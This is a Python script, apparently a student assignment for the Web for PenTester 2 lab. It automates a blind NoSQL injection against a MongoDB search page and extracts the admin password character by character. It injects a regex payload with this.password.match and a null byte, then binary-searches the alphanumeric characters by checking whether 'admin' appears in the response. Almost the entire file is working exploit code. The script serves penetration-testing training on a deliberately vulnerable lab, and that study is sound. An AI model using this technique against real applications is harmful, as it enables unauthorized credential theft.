"""
Gavin Megson
Assignment 1 Summer 2018
Web for PenTester 2, MongoDB Example 2
"""

"""
This program performs a blind SQL injection using a binary search on alphanumeric
characters and regular expressions. For more information, read the WFPT 2 manual.
"""

from bs4 import BeautifulSoup
import requests
import string
import sys
import math

password = ""
matched = 0

"""Some URL strings."""
sitepath = sys.argv[1]
urlpass = sitepath + r"/mongodb/example2/?search=admin' %26%26 this.password.match("
urlstart = sitepath + r"/mongodb/example2/?search=admin' %26%26 this.password.match(/^"
urlend = r")//+%00"

"""The chars we will assume the password uses."""
chars = string.ascii_letters + string.digits


"""Confirm arguments."""
if len(sys.argv) != 2:
	print("Usage: injection.py <website>")
	print("Example: injection.py http://localhost:8001")
	print("Yields: http://localhost:8001/mongodb/example2/?search=admin'"
		"%26%26 this.password.match(/^[abcdefghijklmnopqrstuvwxyzABCD"
		"EFGHIJKLMNOPQRSTUVWXYZ0123456789].*/)//+%00")
	sys.exit(0)


while 1:

	"""Inner loop gets a single character."""
	low = 0
	checklow = low
	high = len(chars)
	checkhigh = high

	while checklow != checkhigh:
		"""Send request with regex."""
		check = chars[int(checklow):int(checkhigh)]
		regex = password + r"[" + check + r"].*/"
		url = urlstart + regex + urlend
		attempt = requests.get(url)
		print(url)

		"""Confirm website response."""
		if attempt.status_code != requests.codes.ok:
			print("Error - response code " +
				str(attempt.status_code) +
				" - check your internet connection!")
			sys.exit(0)

		"""Check if it matched."""
		matched = 0

		data = attempt.text
		soup = BeautifulSoup(data)
		for thing in soup.find_all(text=True):
			if thing == "admin":
				matched = 1
				print(thing)
		print("Pass: " + password)
		print("Checking if any of: [" + check + "] come next")
		if matched == 1:
			print("It matched!")
		else:
			print("No match.")

		"""Adjust which characters to check next time."""
		if matched == 1:
			high = checkhigh
			checkhigh = math.floor((checkhigh + checklow)/2)
		else:
			low = checkhigh
			checklow = checkhigh
			checkhigh = math.ceil((high + low)/2)
	"""
	If more than one character is left, either password already found
	or something went wrong (there's no way to match the current
	password against admin's password without checking every character
	that could come next and ruling it out).
	"""
	if len(check) != 1:
		if matched == 1:
			print("ERROR CHECK - claims to have matched")
		else:
			print("Password probably found!")
		break
	password = password + check
	print("Current password: " + password)


print("PASSWORD: " + password)
